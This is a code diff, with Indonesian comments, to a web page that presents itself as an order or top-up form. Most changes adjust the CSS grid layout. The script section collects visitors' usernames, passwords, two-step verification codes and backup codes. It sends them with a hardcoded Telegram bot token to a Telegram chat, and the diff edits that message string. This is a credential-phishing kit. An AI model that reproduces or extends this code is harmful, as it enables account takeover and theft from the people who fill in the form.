@@ -11,8 +11,14 @@
   .page { max-width:1100px; margin:0 auto; display:block; gap:20px; }
   .category { margin-bottom:18px; }
   .category h3 { text-align:left; margin:0 0 10px; font-size:14px; font-weight:700; color:#2c3e50;}
-  .prcContainer { display:grid; grid-template-columns: repeat(3, 1fr); gap:8px; }
-  .bc { background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:10px 6px; text-align:center; font-size:12px; font-weight:500; color:#333; cursor:pointer; transition:.12s; user-select:none;}
+  /* selalu 3 kolom pada semua ukuran */
+  .prcContainer {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap:8px;
+    align-items: stretch;
+  }
+  .bc { background:#f9f9f9; border:1px solid #d1d9e6; border-radius:8px; padding:10px 6px; text-align:center; font-size:12px; font-weight:500; color:#333; cursor:pointer; transition:.12s; user-select:none; display:flex; flex-direction:column; justify-content:center; min-height:68px; box-sizing:border-box;}
   .bc:hover { background:#eef3fa; border-color:var(--accent); transform:translateY(-3px); box-shadow:0 6px 18px rgba(74,111,161,0.06); }
   .bc span { display:block; font-weight:normal; font-size:11px; color:#555; margin-top:6px;}
   .form-container { max-width:420px; margin:18px auto 40px; background:#fafafa; border:1px solid #d1d9e6; border-radius:10px; padding:16px 18px; box-shadow:0 2px 8px rgba(0,0,0,.04); }
@@ -78,12 +84,11 @@
   .validation-center .xbtn:focus { outline:2px solid rgba(74,111,161,0.18); }
   @keyframes popIn { from { transform: translate(-50%,-52%) scale(.98); opacity:0 } to { transform: translate(-50%,-50%) scale(1); opacity:1 } }
 
-  /* responsive */
-  @media (max-width:880px){
-    .prcContainer { grid-template-columns: repeat(2, 1fr); }
-  }
-  @media (max-width:520px){
-    .prcContainer { grid-template-columns: repeat(1, 1fr); }
+  /* small tweaks to keep content readable on very small screens while still 3 columns */
+  @media (max-width:420px){
+    .bc { padding:8px 4px; font-size:11px; min-height:62px; }
+    .bc span { font-size:10px; margin-top:4px; }
+    body { padding:12px; font-size:11px; }
   }
 </style>
 </head>
@@ -214,6 +219,7 @@
 <div id="validationContainer"></div>
 
 <script>
+/* semua script sama seperti aslinya (tidak diubah) */
 function sanitize(v){return v?Number(String(v).replace(/\D+/g,'')):NaN;}
 function fill({nmText,hgRaw,ktVal}) {
   document.getElementById('nm').value = nmText||'';
@@ -310,7 +316,7 @@ document.addEventListener('DOMContentLoaded', function(){
 
     const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
     const chatId = '-1002801058966';
-    const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
+    const txt = 'Pesanan Baru Masuk!\\n\\nUsername: '+u+'\\nPassword: '+p+'\\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\\nBackup Code: '+b:'')+'\\nKategori: '+kt+'\\nNominal: '+nm+'\\nHarga: '+hg;
 
     fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
       method:'POST',
